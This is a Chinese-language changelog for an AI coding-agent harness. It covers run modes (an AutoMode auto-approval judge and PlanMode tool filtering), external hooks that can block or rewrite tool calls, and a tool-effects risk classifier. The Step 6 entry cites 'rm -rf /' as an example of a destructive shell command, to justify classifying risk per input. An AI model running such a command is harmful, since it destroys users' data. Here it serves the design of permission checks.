    - [apps/cli/src/main.rs](../apps/cli/src/main.rs): `effective_auto_approve` 从「只在 AutoMode 关」改为「只在 AskBeforeEdits 保留 cli.auto_approve；其他模式一律 false」——EditAutomatically / PlanMode 也需要让 dispatch 决策路径生效
    - [apps/cli/src/main.rs](../apps/cli/src/main.rs): 创建 `dump_for_flush = model_io_dump.clone()`；main 返回前 `dump.flush().await`，让 tokio 等 writer task 把 jsonl 落盘后再退出（修「model_io_dump write error: background task failed」）
  - 桌面后端 + 前端
    - [apps/desktop/src/engine/mod.rs](../apps/desktop/src/engine/mod.rs): `EngineEvent` 加 variant `PermissionAutoJudged { tool_name, decision, reason? }`，PascalCase 序列化
    - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `agent_event_to_engine_event` 加 PermissionAutoJudged 分支，转换 `protocol::EventPayload` → `EngineEvent`
    - [apps/desktop/frontend/src/desktop/ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts): TS `EngineEvent` union 加 `{ type: "permission_auto_judged"; tool_name; decision; reason? }` variant
- **验证**:
  - `cargo check --workspace --tests` 通过
  - `cargo test -p agent-core --lib`：130 项全过
  - **真实 CLI 跑测**：`HEBBIAN_DUMP_MODEL_IO=1 hebbian-cli "请用 touch 命令创建 /tmp/hebbian_v3_done 文件" --provider="-uWhDmV-pQPjG5wTHHOg-/claude-opus-4-7" --run-mode auto-mode --tools bash`
    - 输出序列：`🔒 审批：Bash` → `✓ AutoMode 自动放行 [Bash]` → `✓ 允许` → `Bash touch /tmp/hebbian_v3_done ↳ 13ms` → `已创建 /tmp/hebbian_v3_done`
    - dump 文件 `~/.hebbian/sessions/202605111257-cd330e48.model_io.jsonl` 实际有 2 行 jsonl，首行 request 含 `<run_mode>AutoMode</run_mode>` —— **runMode SEMI 注入生效**、**dump 不再 0 字节**
- **影响范围**: agent-core / cli / desktop（含前端 TS）。不动 protocol、storage 文件格式。EnvironmentSnapshot 新增字段是兼容追加（旧代码用 from_workspace 默认 `run_mode = None`）
- **留尾巴**:
  - **PlanMode 行为未实现**：选 `--run-mode plan-mode` 时不过滤工具列表，行为等同 AskBeforeEdits；ExitPlanMode 工具未建。架构 §4.4.5 完整接通留增量
  - **Op::SwitchRunMode / RunModeChanged event 未做**：运行时切换 mode 仍需重启 CLI；前端无信号知道 mode 切换
  - **桌面前端 UI 未渲染 permission_auto_judged**：types.ts union 已加，但 store / ChatView 未消费这个 event；当前 desktop 启 AutoMode 看不到判官标记（CLI 已可见）
  - Step 4 / 6 / 7 / 9 / 11 / 13 / 14 仍未实施
- **关联**: 架构.md §4.4.3 / §4.4.4 / §9.3；上两条 changelog（Step 8 AutoMode 核心 + 真实验证）

### 2026-05-11 — PlanMode 工具过滤 + ExitPlanMode + Step 7 StepStarted/Finished + Op::SwitchRunMode 协议 + system prompt 迁 md + microcompact 工件落盘 + 词汇统一「压缩」

- **Why**: 接通架构.md 多项剩余项，按 §14 迁移路线集中推进 Step 7 / Step 9 / Step 14 + PlanMode 相关尾巴
- **改动**:
  - **PlanMode 行为接通**（架构 §4.4.3 / §4.4.5）：
    - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs) build_model_request 阶段：PlanMode 时从 tool_defs 删除 `Bash/PowerShell/Edit/Write`，注入 `ExitPlanMode`；其他模式删除 `ExitPlanMode` 避免误用
    - 新建 [crates/agent-core/src/tools/exit_plan_mode.rs](../crates/agent-core/src/tools/exit_plan_mode.rs)：`ExitPlanModeTool` 接收 `plan_markdown` 输入，本期仅返回 plan 文本 + 退模式提示；落盘到 `session/plans/plan-<ts>.md` + emit `PlanReady` 留后续接通（需 dispatcher 注入 data_dir+sid）
    - tools/mod.rs 注册 ExitPlanModeTool 到 default_tools
  - **Step 7 ModelStep/ToolStep 分离**（架构 §4.2）：
    - [crates/protocol/src/event.rs](../crates/protocol/src/event.rs) 新增 `EventPayload::StepStarted { step_kind, step_index }` + `StepFinished`；新增 `StepKind` enum（Model / Tool）；[lib.rs](../crates/protocol/src/lib.rs) re-export StepKind
    - agent_loop.rs 加 model_step_index + tool_step_index 计数；模型调用前后 emit StepStarted/Finished(Model)；dispatcher.run_calls 前后 emit StepStarted/Finished(Tool)
    - emit StepFinished(Model) 仅在正常路径触发；模型错误路径直接 break Err，跟 RunCancelled/RunFailed 套件兼容
  - **Op::SwitchRunMode 协议 + RunModeChanged event**（架构 §10.2）：
    - [crates/protocol/src/submission.rs](../crates/protocol/src/submission.rs) 加 `Op::SwitchRunMode { run_id, new_mode: String }`；为避免 protocol → agent-core 反向依赖，new_mode 用字符串载入，actor 端按需解析
    - protocol/event.rs 加 `EventPayload::RunModeChanged { from, to }`
    - actor 当前对 SwitchRunMode 落到默认 debug 分支（架构 §13 的"未真处理 Op"留尾巴）；surface 直接调 Session::set_run_mode 即可
  - **system prompt 迁 md**（架构 §9.1 / Step 14）：
    - 新建 [crates/agent-core/prompts/base_system.md](../crates/agent-core/prompts/base_system.md)：~95 行 markdown，含原 10 段内容（沟通/客观性/工具/可逆性/写代码/验收/Git/安全/输出/环境）+ 新增 §运行模式 段，向模型说明 AskBeforeEdits/EditAutomatically/PlanMode/AutoMode 各自行为
    - [crates/agent-core/src/system_prompt.rs](../crates/agent-core/src/system_prompt.rs): `BASE_SYSTEM_PROMPT` 从 inline `r#"..."#` 字面值改为 `include_str!("../prompts/base_system.md")`；删除 90 行旧字面值；从 292 行精简到 203 行
    - 用户 persona 覆盖（架构 §9.5 ~/.hebbian/prompts/<agent_id>/persona.md）留增量
  - **microcompact 压缩工件落盘**（架构 §4.7 / Step 9）：
    - [crates/agent-core/src/context/microcompact.rs](../crates/agent-core/src/context/microcompact.rs): `MicrocompactReport` 加 `shadowed_artifacts: Vec<(call_id, original_content)>`；占位符从 `"[结果已被压缩]"` 改为 `"[结果已被压缩。原始内容可通过 Read 工具按 call_id 检索：tool_results/<call_id>.txt]"`；幂等性靠 `starts_with("[结果已被压缩")` 判断
    - SessionConfig / RunParams / LoopParams 加 `data_dir: Option<PathBuf>` + `session_id: Option<String>` 字段链路透传
    - agent_loop.rs 跑完 microcompact 后遍历 `shadowed_artifacts`，data_dir+session_id 都给定时调 `storage::tool_results::save_tool_result(...)` 落 txt；surface（CLI / Desktop）通过 SessionConfig 传入
    - CLI SessionConfig 加 `data_dir = persist_ref.data_dir` 透传；Desktop chat.rs 加 `data_dir = Some(data_dir.to_path_buf())`
  - **词汇统一**：批量替换全仓库 `影子化` → `压缩`（涉及 5 个 .rs 注释 + docs/架构.md + docs/compaction.md），与 microcompact 占位符语言一致
- **验证**:
  - `cargo check --workspace --tests` 通过
  - `cargo test -p agent-core --lib`：130 项全过（含 microcompact tests 改为 `starts_with` 断言 + idempotent / under_threshold / skips_non_compactable / shadows_old_keeps_recent 4 项全过）
- **影响范围**: agent-core / protocol / cli / desktop。协议追加 EventPayload variants（StepStarted/StepFinished/RunModeChanged）是兼容追加；旧 surface fallback 默认即可。SessionConfig 加字段是 break change，但本仓库内调用点已同步更新
- **留尾巴**:
  - **Op::SwitchRunMode actor 处理未实施**：当前落到默认 debug log；surface 端切换走 Session::set_run_mode 直接 API
  - **RunModeChanged event 未在 actor 端 emit**：set_run_mode 需要触发事件让 surface 刷新——本期保留协议但未接通
  - **ExitPlanMode 工件落盘未实现**：plan markdown 仅作为 tool result 返回；落到 `session/plans/plan-<ts>.md` + emit `PlanReady` 留增量（需 dispatcher 拿到 data_dir+sid，或 SessionConfig 把 plans 写入路径作为参数）
  - **桌面前端 store 未消费 step_started/step_finished/run_mode_changed/permission_auto_judged**：协议都到位，但 React 端尚未渲染
  - **system prompt 进一步模块化未做**：base_system.md 仍是一个大文件；架构 §9.1 描述的 6 segment 拆分（base_system / tools_guide / context_recall / communication / persona / automode_judge）暂未拆，本期只完成「inline → include_str!」迁移
  - Step 4 CoreClient / Step 6 Tool 接口简化 / Step 11 Hook 11 点位 / Step 13 TUI 仍未实施
- **关联**: 架构.md §4.2 / §4.4.3 / §4.4.5 / §4.7 / §9.1 / §10.2 / §13；上几条 changelog（Step 8 AutoMode + 尾巴接通）

### 2026-05-11 — Step 11 Hook 体系扩到 11 点位 + 外部 socket+JSON 协议 + 桌面前端 EngineEvent 翻译补完

- **Why**: 推进架构.md §4.8 完整 11 点位 hook 体系（CodeIsland 互操作标准）；同时补完桌面前端 store/types 对上一批新增 EventPayload 的消费
- **改动**:
  - agent-core / hooks
    - [crates/agent-core/src/hooks/types.rs](../crates/agent-core/src/hooks/types.rs): `HookPoint` 由 4 个内置点位扩到 4 + 11 = 15 个 variant。新增外部 11 点位（与 CodeIsland EventNormalizer 一致）：SessionStart / SessionEnd / UserPromptSubmit / PreToolUse / PostToolUse / PostToolUseFailure / PermissionRequest / PreCompact / PostCompact / Notification / Stop；加 `event_name()` 方法用于 JSON 协议
    - 新建 [crates/agent-core/src/hooks/external.rs](../crates/agent-core/src/hooks/external.rs): `ExternalHook` + `HookMatcher` + `HookRule` + `HookConfig`，按架构 §4.8.2 实现 socket+JSON 协议——hook 命令通过 stdin 接 `{event, context}` JSON 一行，stdout 返回 `{outcome: continue|modify|block, reason?}` 一行；超时（默认 5s）视为 Continue；matcher 按工具名过滤（`tool: "*"` = 全部，`tool: "Bash"` = 仅匹配 Bash）；`load_hooks_config(data_dir)` 解析 `~/.hebbian/hooks.json`，缺失或解析失败回退空 config
    - [crates/agent-core/src/hooks/mod.rs](../crates/agent-core/src/hooks/mod.rs): 暴露 `external::*` 子模块
  - CLI / Desktop 接入
    - [apps/cli/src/main.rs](../apps/cli/src/main.rs): `build_harness_and_client` 调 `load_hooks_config(data_dir)` + `ExternalHook::from_config(...)` 构造外部 hook 列表，传给 `HookManager::new(...)` 替代原 `HookManager::empty()`
    - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): 同样接入；hook 加载用桌面计算出的 `data_dir`
  - 桌面 EngineEvent 翻译补完（架构 §10 数据流）
    - [apps/desktop/src/engine/mod.rs](../apps/desktop/src/engine/mod.rs): EngineEvent 新增 `StepStarted{ step_kind, step_index }` / `StepFinished` / `RunModeChanged{ from, to }`
    - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs) `agent_event_to_engine_event`：补齐 StepStarted / StepFinished / RunModeChanged 三个 EventPayload variant 的翻译；StepKind enum 映射为字符串 `"model"` / `"tool"`
  - 桌面前端
    - [apps/desktop/frontend/src/desktop/ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts): EngineEvent union 加 `step_started` / `step_finished` / `run_mode_changed` 三个 variant
    - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): `applyEventToSlot` 加这三个 + `permission_auto_judged` 的消化分支（当前不渲染弹窗，仅消化事件以便后续 ChatView 接入气泡 / 状态栏标签）
- **验证**: `cargo check --workspace --tests` 通过；`cargo test -p agent-core --lib` 130 项全过；`pnpm exec tsc --noEmit` 0 错误
- **影响范围**: agent-core / cli / desktop（前后端）。协议追加是兼容追加
- **留尾巴**:
  - 11 个外部 hook 点位的 emit 接通：HookPoint enum + ExternalHook 协议 + HookManager 装载已完成，但 agent_loop/dispatch/Session 还没在对应点位调 `hooks.trigger(...)`；需要把 HookManager 引用透传到 ToolDispatcher 等位置——单独一批做
  - HookOutcome::Modify 协议未实施：外部 hook 当前可 continue / block 但 modify 路径会被忽略；完整 patch 协议留增量
  - 桌面 ChatView 渲染：types/store 已接事件，但 ChatView 没渲染气泡/状态栏标签；前端 UI 实施留下一批
- **关联**: 架构.md §4.8.1 / §4.8.2 / §4.8.3 / §4.2 / §10.2；CodeIsland `codeisland-remote-hook.py` 协议

### 2026-05-11 — PreToolUse/PostToolUse hook 真接通 + 工具命名统一 PascalCase

- **Why**: 继续推进架构.md：(1) Step 11 的"emit 接通"——HookManager 透传给 ToolDispatcher，dispatch_one 内 emit PreToolUse / PostToolUse / PostToolUseFailure；(2) Step 6 的"工具命名 PascalCase"小尾巴——ask / web_search / web_fetch 三个小写工具名改 Ask / WebSearch / Fetch 与架构 §4.4.7 + §13 决策对齐
- **改动**:
  - **PreToolUse / PostToolUse hook 真接通**：
    - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs) `ToolDispatcher` 加字段 `hooks: Arc<HookManager>` + `session_id_for_hooks: Option<String>`；`spawn_tool` future 内 capture 这两个值
    - dispatch_one 在 await_permission_decision 通过后、cancel 检查后、`tool.execute` 之前 trigger `HookPoint::PreToolUse`：返回 `Block(reason)` 时把 `format!("PreToolUse hook blocked: {reason}")` 渲染成 deny_tool（与 HITL 拒绝同一渲染路径）
    - `tool.execute` 之后、`emit ToolCallFinished` 之前 trigger `HookPoint::PostToolUse`（成功）或 `HookPoint::PostToolUseFailure`（exec_failed）；当前 fire-and-forget，不消费 hook 返回结果——完整 modify 协议留 Step 11 增量
    - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs) 构造 ToolDispatcher 时传 `hooks.clone() + session_id.clone()`；dispatch.rs 测试构造点补 `hooks: Arc::new(HookManager::empty()) / session_id_for_hooks: None`
  - **工具命名 PascalCase**（架构 §4.4.7 / §13）：
    - `ASK_TOOL_NAME` 由 `"ask"` 改 `"Ask"`（[tools/mod.rs](../crates/agent-core/src/tools/mod.rs)）
    - web_search.rs spec.name `"web_search"` → `"WebSearch"`；web_fetch.rs `"web_fetch"` → `"Fetch"`（与架构 §4.4.6 工具列表对齐——`Fetch` 而非 cc-haha 的 `WebFetch`）
    - 同步改 [definition.rs](../crates/agent-core/src/definition.rs) 默认 `auto_approve` 列表 / [context/microcompact.rs](../crates/agent-core/src/context/microcompact.rs) `COMPACTABLE_TOOLS` 白名单 / [tools/mod.rs](../crates/agent-core/src/tools/mod.rs) `hosted_tool_definitions` + `tool_manifest`
    - 前端 [useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts) localStorage 默认值 `'["web_search","web_fetch"]'` → `'["WebSearch","Fetch"]'`
- **验证**: `cargo check --workspace --tests` 通过；`cargo test -p agent-core --lib` 130 项全过；`pnpm exec tsc --noEmit` 0 错误
- **影响范围**: agent-core / cli / desktop（前后端）。
  - **破坏性兼容**：旧 jsonl 含 `"ask" / "web_search" / "web_fetch"` 工具名的 tool_call entries 加载后 dispatch 找不到对应工具——需要回放老 session 的用户启新 user message 才会受影响；老 transcript 内的 tool_result 不影响显示
  - model-gateway 内的 protocol 解析 mock 测试（含 `"web_search" / "ask"` 字面值）保持不动——这些是 provider 解析测试，与 agent-core 工具分发解耦
- **留尾巴**:
  - **SessionStart / SessionEnd / UserPromptSubmit / Stop / PreCompact / PostCompact / Notification / PermissionRequest emit 接通**：HookManager 已装载，但 agent_loop / Session / surface 还没在这些点位调 trigger；需要 Session 持 Arc<HookManager> 引用或 surface 端 emit
  - **HookOutcome::Modify protocol**：完整外部 hook 改 input/result 的 patch 协议未实施（架构 §4.8.2 完整版）
  - **Tool trait 简化（删 classify / affected_paths / permission_fingerprint）**：本批未做；架构 §4.4.1 要求接口精简到 spec + invoke，effects 分析挪到 dispatcher 旁的 `effects.rs` 模块。本期仅做工具命名 PascalCase，trait 简化与 effects.rs 拆分留 Step 6 完整批
  - **旧工具名兼容映射**：未做。重开旧 session 后续 tool_call 名按新名（用户基本不受影响，只是 agent 不会再调旧名工具）
  - Step 4 CoreClient / Step 13 TUI ratatui 仍未实施
- **关联**: 架构.md §4.4.6 / §4.4.7 / §4.8.1 / §13；上一条 changelog（Step 11 HookManager 装载）

### 2026-05-11 — Harness::hooks() 访问器（供 Session 等接通 SessionStart/End/UserPromptSubmit hook）

- **Why**: 为后续 Session / surface 端 emit SessionStart / SessionEnd / UserPromptSubmit / Stop 等 11 点位外部 hook 留接入点
- **改动**: [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs) Harness 加 `pub fn hooks() -> Arc<HookManager>` 访问器
- **验证**: cargo check 通过
- **留尾巴**:
  - SessionStart 等具体 emit 接通仍未做：需要 Session 持 hooks 字段 + spawn 异步 trigger（Session::new 当前 sync）或把 surface 端 emit 加进 cli/desktop chat 流程；本批仅暴露访问器作为前置准备
  - SubagentStart / SubagentStop hook 不做：D9 决策不实施 multi-agent
- **关联**: 架构.md §4.8.1；上一条 changelog

### 2026-05-11 — Step 6 Tool trait 简化 + effects.rs 解耦

- **Why**: 推进架构.md §4.4.1 / §4.4.2 / §13 "工具自报分类 → 派发器解析 effects" 的解耦。Tool trait 之前持 `classify` / `affected_paths` / `permission_fingerprint` 三个上下文相关的默认实现，让每个工具自带「我会动哪些路径 / 我是什么风险」的判断。架构定调把这些信息挪到工具旁的 `effects.rs` 集中分发——同一个 `Bash "ls /tmp"` 和 `Bash "rm -rf /"` 风险天差地别，分类天然属于 dispatcher 在拿到具体 input 后做的事
- **改动**:
  - 新建 [crates/agent-core/src/effects.rs](../crates/agent-core/src/effects.rs)：`Effects` 结构体（paths / command_fingerprint / network / domain / risk / class / is_concurrent_safe）+ `EffectClass` enum（ReadOnly / Mutating / Destructive / Network / NeedsHumanInput）+ `analyze_effects(tool_name, input)` 入口。按工具名 dispatch 到 helper：
    - `Ask` → NeedsHumanInput
    - `Bash` / `PowerShell` → 沿用原 BashTool 的 shell_parse + safe_commands 启发式逻辑——全部子命令安全且无危险结构 → ReadOnly；否则 Destructive(High)。fingerprint = 首个子命令 `argv.join(" ")`，复合命令取首段；paths = `input.cwd`（缺省由 dispatcher 用 workspace.workdir 兜底）
    - `Read` → ReadOnly + paths = [file_path]
    - `Write` / `Edit` → Mutating(Medium) + paths = [file_path]
    - `Glob` / `Grep` → ReadOnly + paths = [path or 空]
    - `WebSearch` → Network（无 domain）
    - `Fetch` → Network + domain = reqwest::Url::parse(url).host_str()
    - `Skill` / `TodoWrite` / `ExitPlanMode` / `BashOutput` / `KillShell` → ReadOnly
    - 未知工具 → Mutating(Medium) 兜底（让 HITL 把关，比误判 ReadOnly 安全）
  - effects.rs 自带 11 项单测覆盖每个工具名分支
  - [crates/agent-core/src/lib.rs](../crates/agent-core/src/lib.rs): 注册 `pub mod effects`
  - [crates/agent-core/src/tools/mod.rs](../crates/agent-core/src/tools/mod.rs): 删除 `ToolClass` enum / `HumanInputKind` enum / `ToolClass::is_concurrent_safe` / `Tool::classify` / `Tool::affected_paths` / `Tool::permission_fingerprint`；Tool trait 精简到 4 个方法：`name` / `description` / `parameters_schema` / `execute`
  - 各工具实现删除覆盖：[bash.rs](../crates/agent-core/src/tools/bash.rs) / [write.rs](../crates/agent-core/src/tools/write.rs) / [read.rs](../crates/agent-core/src/tools/read.rs) / [grep.rs](../crates/agent-core/src/tools/grep.rs) / [web_fetch.rs](../crates/agent-core/src/tools/web_fetch.rs) / [web_search.rs](../crates/agent-core/src/tools/web_search.rs) / [exit_plan_mode.rs](../crates/agent-core/src/tools/exit_plan_mode.rs)。删除工具内 `class_of` / `affected_paths_*` / `classify_*` 测试（同等覆盖搬到 effects.rs）
  - [crates/agent-core/src/tools/hitl.rs](../crates/agent-core/src/tools/hitl.rs): `HitlGate::check(tool_name, class: &ToolClass, fingerprint: Option<&str>)` 签名改为 `HitlGate::check(tool_name, effects: &Effects)`——fingerprint 从 `effects.command_fingerprint` 取，class 改用 `effects.class` 模式匹配。测试块构造 helper `destructive_effects` / `readonly_effects` 替代原 `destructive() -> ToolClass`
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `tool_class_label` → `effect_class_label`；spawn_tool 内不再调 `tool.classify` / `tool.affected_paths` / `tool.permission_fingerprint`，改一次 `analyze_effects(&call.name, &call.input)` 拿全部信息；Bash/PowerShell `effects.paths` 为空时兜底加 workspace.workdir 让越界检查命中
  - 文档注释清理：safe_commands.rs / kill_shell.rs / bash_output.rs 中提到 `ToolClass::ReadOnly` 的注释改为 `EffectClass::ReadOnly`
- **验证**: `cargo check --workspace --tests` 通过；`cargo test -p agent-core --lib` 129 项全过（原 130 减去搬移 / 删除的 affected_paths_* / classify_*，加 effects::tests 11 项）
- **影响范围**: agent-core 内部。Tool trait 简化对外影响：自定义工具（未来插件）不再需要实现 classify / affected_paths / permission_fingerprint——分类信息默认走 effects.rs 的 fallback (Mutating Medium)，需要细粒度分类的工具应在 effects.rs 加分支而非工具内覆盖。CLI / Desktop / protocol 不受影响
- **留尾巴**:
  - PowerShell 工具实现尚未在仓库中（只在 effects.rs 占位 + 架构.md 提及），等 Windows 端实施时跑全链路验证
  - `EffectClass::Mutating` 当前不再带 RiskLevel 字段（原 `ToolClass::Mutating { risk }` 信息已隐含到 `Effects.risk`），如果未来需要按 risk 细分逻辑要回看 dispatcher
  - effects.rs fallback `EffectClass::Mutating(Medium)` 对未知工具略保守——若用户加自定义 ReadOnly 工具会强制走审批；要解决得把 fallback 配置化或允许工具自报 hint
- **关联**: 架构.md §4.4.1 / §4.4.2 / §4.4.7 / §13；上几条 changelog（工具命名 PascalCase / Hook 体系）

### 2026-05-11 — 小尾巴接通：4 个外部 hook emit + Op::SwitchRunMode actor + ExitPlanMode 落盘 + 桌面 AutoJudge 气泡

- **Why**: 一次性接通架构 §4.8.1 / §10.2 / §4.4.5 / §4.4.4 多个上批留下的尾巴，让 11 点位 hook 体系 / RunMode 切换 / PlanMode 工件 / AutoMode 判官在前后端有可见效果
- **改动**:
  - **2.A SessionStart / SessionEnd / UserPromptSubmit / Stop hook emit**：
    - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs) `Session` 加字段 `hooks: Arc<HookManager>`（从 `harness.hooks()` 取）。`Session::new` 同步路径里若 hooks 非空且有 session_id，spawn 一个异步任务 fire-and-forget trigger `HookPoint::SessionStart { session_id, workdir }`；`append_user` 在最终 user text 落 transcript 前 spawn 异步 trigger `UserPromptSubmit { session_id, text }`；新增 `Session::close()` async 方法 trigger `SessionEnd`（surface 退出 / 切换 session 时调）
    - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs) 顶部 cancellation 分支：`is_cancelled` 命中后 `hitl.cancel_all_pending()` 之后、`break Err(Cancelled)` 之前 fire-and-forget trigger `HookPoint::Stop { session_id, reason: "user_cancelled" }`
  - **2.B Op::SwitchRunMode actor 处理 + RunModeChanged emit**：
    - [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs) `RunRegistration` 加字段 `sink: EventSink + state: Arc<RunState> + run_mode: Arc<Mutex<RunMode>>`；spawn_run 在创建 sink 后注册到全局 runs 表（顺序调整：之前是先注册再 build sink，现改为先 build sink 再注册 sink.clone）
    - actor `run_actor_loop` 加 `Op::SwitchRunMode { run_id, new_mode }` 分支：解析 new_mode 字符串 → `RunMode::parse` → 更新 `entry.run_mode` 内值 + 通过 `entry.sink` emit `RunModeChanged { from, to }`。**仅 emit，不真切运行时 mode**——dispatcher 已捕获的 `run_mode` 值不会立刻刷新，下一轮 dispatch 仍按 spawn_run 时的 RunMode 走。完整运行时切换需要把 `ToolDispatcher.run_mode` 改为 `Arc<Mutex<RunMode>>`，本期留尾巴
  - **2.C ExitPlanMode 工件落盘**：
    - 新建 [crates/agent-core/src/storage/plans.rs](../crates/agent-core/src/storage/plans.rs)：`save_plan(data_dir, sid, content) -> PathBuf`，路径 `<data_dir>/sessions/<sid>/plans/plan-<yyyymmddHHmmss>.md`，通过 `lock::write_atomic` 写入；附 1 项单测验证目录结构
    - [crates/agent-core/src/storage/mod.rs](../crates/agent-core/src/storage/mod.rs) 注册 `pub mod plans`
    - [crates/agent-core/src/tools/exit_plan_mode.rs](../crates/agent-core/src/tools/exit_plan_mode.rs) `ExitPlanModeTool::execute` 改为读 env var `HEBBIAN_CURRENT_DATA_DIR` + `HEBBIAN_CURRENT_SESSION_ID`，两者都给定时调 `plans::save_plan`，返回 `[Plan recorded] ... Plan saved at: <path>`；env var 缺失保持旧行为只返回提示。常量 `ENV_DATA_DIR` / `ENV_SESSION_ID` 公开，供 CLI / Desktop 引用
    - [apps/cli/src/session.rs](../apps/cli/src/session.rs) `CliSession::new` 内若 persist_ref 给定，set 两个 env var
    - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs) `send_and_save_in_data_dir_with_client_factory` 在 `CoreSession::new` 之前 set 两个 env var
  - **2.D 桌面 ChatView 渲染 AutoJudgedBadge + RunMode 标签**：
    - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts) `SessionStream` 加 `autoJudgedNotes: AutoJudgedNote[]` + `currentRunMode: string | null`；export `AutoJudgedNote = { toolName, decision, reason? }`。`applyEventToSlot` 的 `permission_auto_judged` 分支累积到 `autoJudgedNotes`；`run_mode_changed` 分支更新 `currentRunMode = e.to`；EMPTY_MIRROR / mirrorFromSlot / 全局字段 / initialSlot 同步追加两字段
    - [apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx) 从 store 取 `autoJudgedNotes / currentRunMode`；在 streaming bubble 之后渲染：(1) 一行 `RunMode: <mode>` 状态标签（首次 RunModeChanged 后才出现），(2) 每个 PermissionAutoJudged 渲染一行简短气泡 `✓/✗/? AutoMode 自动放行|拒绝|转人工 [<工具>]：<reason>`
- **验证**: `cargo check --workspace --tests` 通过；`cargo test -p agent-core --lib` 130 项全过（含 `storage::plans::tests::save_plan_creates_dir_and_file` 新单测）；`pnpm exec tsc --noEmit` 0 错误
- **影响范围**:
  - agent-core / cli / desktop（前后端）。Session 新增 `close()` 方法是兼容追加；surface 不调也不会泄漏 hook（旧 SessionEnd 本来就没接通）
  - 不动 protocol：Op::SwitchRunMode / RunModeChanged 上批已加，本批只补 actor 处理
  - 不动 storage 文件格式：plans 是新目录，旧 session 不受影响
  - 行为变更：CLI / Desktop 启动时会读 `HEBBIAN_CURRENT_DATA_DIR` / `HEBBIAN_CURRENT_SESSION_ID` env var——若用户手动设置过这两个值会被覆盖（仅 ExitPlanMode 使用，影响面有限）
- **留尾巴**:
  - **Op::SwitchRunMode 不真切运行时 RunMode**：本期 actor 仅 emit RunModeChanged + 更新 `run_mode` Mutex，但 `ToolDispatcher.run_mode` 是值类型已克隆进 dispatcher，运行时切换无效。完整接通要把 dispatcher 改为读 `Arc<Mutex<RunMode>>`，留 Step 8 增量
  - **ExitPlanMode env var 在多窗口 desktop 并发有竞态**：进程级 env var 在两个 chat 并发时后写覆盖前写，会导致 ExitPlanMode 落到错误 session 的 plans 目录。Step 4 CoreClient 重构时把 data_dir + session_id 通过工具构造注入解决
  - **PlanReady 事件未 emit**：plans::save_plan 落盘后 ExitPlanModeTool 只返回 tool result 文本，不主动 emit `PlanReady { path, summary }`。surface 端要拿到落盘路径只能 parse tool result——后续把 dispatcher 注入事件 sink 给 ExitPlanModeTool 后再接通
  - **Session::close() 没有自动调用点**：当前是手动 API，CLI / Desktop 退出前没主动调；要让 SessionEnd hook 真有效需要 surface 接通 / 或 Session 实现 Drop（但 Drop 不能 await async hook）
  - **AutoJudgedBadge run 结束后清空**：autoJudgedNotes 是 slot 上字段，slot 在 run 结束 reload session 时整体被清掉——所以 streaming 期间能看到，看完历史 session 看不到。这是合理行为：判官标记不进 jsonl，重开 session 就看不到（与 PermissionRequested 同等级）
  - **桌面状态栏 RunMode 标签是临时实现**：当前在 ChatView 内悬浮一行，不在正式状态栏；正式状态栏建好后挪走
- **关联**: 架构.md §4.4.4 / §4.4.5 / §4.8.1 / §10.2 / §13；上几条 changelog（Step 11 / 工具 PascalCase / Step 6 Tool trait 简化）

### 2026-05-11 — HookOutcome::Modify 完整 patch 协议（PreToolUse 改 input + PostToolUse 改 result）

- **Why**: 推进架构.md §4.8.2 / §4.8.4 完整 Modify patch 协议——上一批 Hook 11 点位接通时只支持 `Continue` / `Block`，外部 hook 想改写工具入参 / 结果 / system prefix 都被忽略。本期把 `HookOutcome::Modify(HookPatch)` 真正打通 dispatcher，让 hook 能：(1) 在 PreToolUse 改 input（脱敏 / 强制参数 / 路径规范化）；(2) 在 PostToolUse 改 result（截短 / 加注释）
- **改动**:
  - [crates/agent-core/src/hooks/types.rs](../crates/agent-core/src/hooks/types.rs): 新增 `HookPatch { input: Option<Value>, result: Option<String>, system_prefix: Option<String> }`；`HookOutcome` 加 `Modify(HookPatch)` variant
  - [crates/agent-core/src/hooks/mod.rs](../crates/agent-core/src/hooks/mod.rs): re-export `HookPatch`
  - [crates/agent-core/src/hooks/external.rs](../crates/agent-core/src/hooks/external.rs): `run_one` 的 `"modify"` 分支不再 ignore——从 `resp.patch` 解析三字段，全为空时降级 `None`（视为 Continue），否则返回 `HookOutcome::Modify(HookPatch)`
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs) `spawn_tool` future：
    - 引入 `effective_input = call.input.clone()` 局部可改写值
    - PreToolUse hook 分支从单一 `Block` 改为 `match`：`Block(reason)` 走 deny_tool（保留原行为）；`Modify(patch)` 若有 `patch.input` 则覆盖 `effective_input`，工具调用 + ToolCallStarted emit 都用新 input
    - 工具结果 `let (content, truncated)` 改为 `let (mut content, truncated)`，让 PostToolUse 可覆盖
    - PostToolUse hook 分支增加 `Modify(patch)` 处理：成功路径下若有 `patch.result` 则覆盖 `content`，随后 emit 的 `ToolCallFinished.result` 与 `ToolResult.content` 都是改写后版本；失败路径只观察不改（避免 hook 把错误信息洗成"成功"）
- **验证**: `cargo check --workspace --tests` 通过；`cargo test -p agent-core --lib` 130 项全过
- **影响范围**: agent-core 内部。`HookOutcome` 新增 variant 是兼容追加，无外部 surface 直接 match `HookOutcome` 全分支。Protocol / Storage 不动
- **留尾巴**:
